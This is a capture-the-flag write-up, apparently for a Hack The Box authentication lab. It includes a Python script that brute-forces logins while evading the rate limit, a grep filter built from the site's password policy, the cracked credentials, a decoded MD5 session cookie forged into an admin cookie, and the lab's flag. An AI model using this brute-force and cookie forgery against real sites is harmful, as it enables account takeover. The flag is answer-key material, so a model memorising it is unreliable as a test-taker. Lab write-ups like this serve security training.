# Skill Assessment - Broken Authentication

During our penetration test, we come across yet another web application. While the rest of the team keeps scanning the internal network for vulnerabilities in an attempt to gain an initial foothold, you are tasked with examining this web application for authentication vulnerabilities.

Find the vulnerabilities and submit the final flag using the skills we covered in the module sections to complete this module.

From past penetration tests, we know that the `rockyou.txt` wordlist has proven effective for cracking passwords.

**Questions**

Assess the web application and use various techniques to escalate to a privileged user and find a flag in the admin panel. Submit the contents of the flag as your answer.

```bash
#https://infosecwriteups.com/solving-the-htb-ctf-broken-authentication-7e8333d618d
#in register new account, we enumerate the password policy
The password must start with a capital letter
The password must contain at least one lowercase
The password must contain at least one special char: $ # @
The password is shorter than 20 characters
#then login with the created account
```

rate\_limit.py

```python
import requests
import time

# file that contains passwords
userpass_file = "rockyou.txt" # but first filter out the passwords that do not comply with the password policy

# file that contains usernames
usernames_file = "users.txt" # seclists top names + country codes (.xx)

# create url using user and password as argument
url = "http://.../login.php"

# rate limit blocks for 30 seconds
lock_time = 30

# message that alert us we hit rate limit
lock_message = "Too many login failures"

# read user and password
with open(usernames_file, "r") as f:
 for line in f:
    username = line.rstrip()

    with open(userpass_file, "r") as fh:
        for fline in fh:
            password = fline.rstrip()

            # prepare POST data
            data = {
                "userid": username,
                "passwd": password,
                "submit": "submit"
            }

            print(data)

            # do the request
            res = requests.post(url, data=data)

            # handle generic credential error
            if "Invalid credentials" in res.text:
                print("[-] Invalid credentials: userid:{} passwd:{}".format(username, password))
            # user and password were valid !
            elif "Welcome back" in res.text:
                print("[+] Valid credentials: userid:{} passwd:{}".format(username, password))
            # hit rate limit, let's say we have to wait 30 seconds
            elif lock_message in res.text:
                print("[-] Hit rate limit, sleeping 30")
                # do the actual sleep plus 0.5 to be sure
                time.sleep(lock_time+0.5)
```

now to find out the account password with the script above

```bash
#we filter out rockyou.txt with the rules found above for password.txt
sudo grep '^[[:upper:]]' /usr/share/wordlists/rockyou.txt |grep '[$@#]' |grep '[[:lower:]]' |grep -E '.{18,}[0-9]$' > password.txt

#enumerate username in this page
http://94.237.58.148:43583/messages.php #use burpsuite with cirt-default-usernames.txt
#guest, support

#enumerate payload with support account
https://gist.githubusercontent.com/eternalbluesec/def400982cadb4cb145d88ec2b408283/raw/cc65229886df02518b11cbf8b520e8b7cb04ae6b/country_codes.txt

#for the username
cat username.txt 
support.us
support.it
support.gr
support.uk
support.cn

#run the python script
python3 rate_limit.py
#[+] Valid credentials: userid:support.us passwd:Mustang#firebird1995
#[+] Valid credentials: userid:support.uk passwd:TrillPrincessMentality#1
#[+] Valid credentials: userid:support.cn passwd:BisocaBuzau#20061985

#login and catch the hash cookie
#decode it with dcode
https://github.com/s0md3v/Decodify
#this example result from support.uk
dcode OTBkNzUyOWE0NTVmNzIwYWQwY2U3YTMyYjNmZTRmMmI6NDM0OTkwYzhhMjVkMmJlOTQ4NjM1NjFhZTk4YmQ2ODI%3D
[+] Decoded from URL encoding : OTBkNzUyOWE0NTVmNzIwYWQwY2U3YTMyYjNmZTRmMmI6NDM0OTkwYzhhMjVkMmJlOTQ4NjM1NjFhZTk4YmQ2ODI=
[+] Decoded from Base64 : 90d7529a455f720ad0ce7a32b3fe4f2b:434990c8a25d2be94863561ae98bd682
#its an 2 md5 hash combined, we can decoded it individually
90d7529a455f720ad0ce7a32b3fe4f2b = support.uk
434990c8a25d2be94863561ae98bd682 = support
#now we recreate the hash as admin.uk
#in cyberchef
e6fe84444c51ccdce10e0efeda77083b = admin.uk
21232f297a57a5a743894a0e4a801fc3 = admin
#hash
e6fe84444c51ccdce10e0efeda77083b:21232f297a57a5a743894a0e4a801fc3
#back to cyberchef
Congratulation! You have passed the assessment test, 
here is your flag HTB{1_br0k3_4uth_4_br34kf4st}
```
